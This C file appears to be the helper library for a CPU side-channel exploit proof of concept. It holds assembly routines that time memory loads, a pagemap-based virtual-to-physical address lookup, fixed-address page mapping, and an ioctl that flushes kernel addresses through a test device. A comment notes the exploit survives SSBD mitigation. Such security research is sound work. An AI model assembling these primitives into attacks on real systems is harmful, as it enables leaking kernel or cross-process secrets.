/* Copyright (c) 2025, Google Inc.
 *
 * Permission to use, copy, modify, and/or distribute this software for any
 * purpose with or without fee is hereby granted, provided that the above
 * copyright notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
 * WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY
 * SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
 * WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION
 * OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
 * CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE. */

#include "lib.h"

#if defined(__x86_64__)

uint64_t time_load(const void *addr) {
  uint64_t ret;

  asm volatile(
      // rdtscp waits for earlier instructions to retire before reading the
      // TSC.
      "rdtscp\n"
      // timestamp in r8d:ebx
      "mov %%eax, %%ebx\n"
      "mov %%edx, %%r8d\n"
      "lfence\n"

      // Do the memory access.
      "movb (%%rdi), %%cl\n"

      // On AMD/Linux lfence always waits for all previous instructions to
      // retire before executing the next instruction.
      "rdtscp\n"
      // timestamp in edx:eax
      "lfence\n"

      "shlq $32, %%r8\n"
      // timestamp in rbx
      "orq %%r8, %%rbx\n"
      "shlq $32, %%rdx\n"
      // timestamp in rax
      "orq %%rdx, %%rax\n"
      "subq %%rbx, %%rax\n"
      : "=a"(ret)
      : "D"(addr)
      : "rbx", "rcx", "rdx", "r8", "memory");

  return ret;
}

#elif defined(__aarch64__)
uint64_t time_load(const void *addr) {
  uint64_t start;
  uint64_t end;
  uint32_t scratch;

  asm volatile(
      // Sync so that no previous instruction is reorderd after the
      // timer read.
      "isb\n\t"

      // Read the timer.
      "mrs %[start], cntvct_el0\n\t"

      // Sync to prevent the load from being reordered before
      // the timer read.
      "isb\n\t"

      // Do the memory access.
      "ldrb %w[scratch], [%[addr]]\n\t"

      // Sync to prevent the load from being reordered after the
      // second timer read.
      "isb\n\t"

      // Read the timer again.
      "mrs %[end], cntvct_el0\n\t"

      // Sync so that no later instructions are reorderd before the
      // timer read.
      "isb\n\t"
      : [start] "=&r"(start), [end] "=r"(end), [scratch] "=&r"(scratch)
      : [addr] "r"(addr)
      : "x2", "memory");

  return end - start;
}

#endif

struct xorshift128_state {
    uint32_t x[4];
};
struct xorshift128_state state;

/* The state must be initialized to non-zero */
uint32_t xorshift128()
{
  /* Algorithm "xor128" from p. 5 of Marsaglia, "Xorshift RNGs" */
  uint32_t t  = state.x[3];

  uint32_t s  = state.x[0];  /* Perform a contrived 32-bit shift. */
  state.x[3] = state.x[2];
  state.x[2] = state.x[1];
  state.x[1] = s;

  t ^= t << 11;
  t ^= t >> 8;
  return state.x[0] = t ^ s ^ (s >> 19);
}

uint64_t get_rand64() {
  uint64_t res = xorshift128();
  return (res<<32) | xorshift128();
}

void* alloc_pages_at(uint64_t r, size_t sz) {
  char* p = mmap((void *)r, sz, PROT_READ | PROT_WRITE,
                           MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
  if (p == MAP_FAILED || p != (void*)r) {
    printf("tried: (%llx)\n", r);
    perror("mmap1");
    exit(1);
  }
  for (size_t i = 0; i < sz; i += 4096) {
    p[i] = 0x41;
  }
  return p;
}

void* alloc_page_at(uint64_t r) {
  return alloc_pages_at(r, 4096);
}

void* alloc_random_page_(uint64_t and_with, uint64_t or_with) {
  uint64_t r = get_rand64();
  r &= and_with;
  r &= USERPAGE_MASK;
  r |= or_with;
  return alloc_page_at(r);
}

void* alloc_random_pages_(uint64_t and_with, uint64_t or_with, size_t sz) {
  uint64_t r = get_rand64();
  r &= and_with;
  r &= USERPAGE_MASK;
  r |= or_with;
  return alloc_pages_at(r, sz);
}

void* alloc_random_page() {
  return alloc_random_page_(USERPAGE_MASK, 0);
}

void* alloc_random_pages(size_t sz) {
  return alloc_random_pages_(USERPAGE_MASK, 0, sz);
}

void init(int argc, char** argv) {
  // Enable SSBD. Exploit still works.
  //int rc = prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_STORE_BYPASS, PR_SPEC_DISABLE, 0, 0);
  //if (rc < 0) {
  //  fprintf(stderr, "ERROR: Couldn't set the value of the PR_SPEC_STORE_BYPASS prctl: %m\n");
  //  exit(1);
  //}

  if (argc != 2) {
    printf("Usage: %s 123\n(123 - randomization argument)\n\nE.g. for i in `seq 1 1000`; do taskset -a -c 15 %s $i ; done\n", argv[0], argv[0]);
    exit(1);
  }
  int randomize = atoi(argv[1]);
  if (randomize == 0) {
    randomize = 13379001; // cannot be zero.
  }
  state.x[0] = randomize;
  state.x[1] = randomize;
  state.x[2] = randomize;
  state.x[3] = randomize;

  for (int i = 0; i < 100; i++) {
    get_rand64(); // skip entropy;
  }
}

uint64_t virt_to_phys(const void *addr) {
  uint64_t pa_with_flags;

  int fd = open("/proc/self/pagemap", O_RDONLY);
  lseek(fd, ((uint64_t)addr & (~(4096 - 1))) >> 9, SEEK_SET);
  read(fd, &pa_with_flags, sizeof(uint64_t));
  close(fd);

  return (pa_with_flags << 12) | ((uint64_t)addr & (4096 - 1));
}


void shuffle(uint64_t *array, size_t n) {
  if (n > 1) {
    size_t i;
    for (i = 0; i < n - 1; i++) {
      size_t j = i + rand() / (RAND_MAX / (n - i) + 1);
      uint64_t t = array[j];
      array[j] = array[i];
      array[i] = t;
    }
  }
}

int open_mod() {
  char path[] = "/dev/read_mod_dev";
  int fd = open(path, O_RDWR);

  if (fd == -1) {
    perror("open");
    exit(EXIT_FAILURE);
  }
  return fd;
}

#define IOCTL_FLUSH_KERNEL_ADDR _IOR('q', 3, unsigned long)

struct read_params {
  unsigned long address;
  unsigned long count;
};

void flush_kernel_address(int fd, uint64_t addr) {
  struct read_params rp;
  rp.address = addr;
  rp.count = 0;

  if (ioctl(fd, IOCTL_FLUSH_KERNEL_ADDR, &rp) != 0) {
    perror("ioctl");
    exit(EXIT_FAILURE);
  }
}

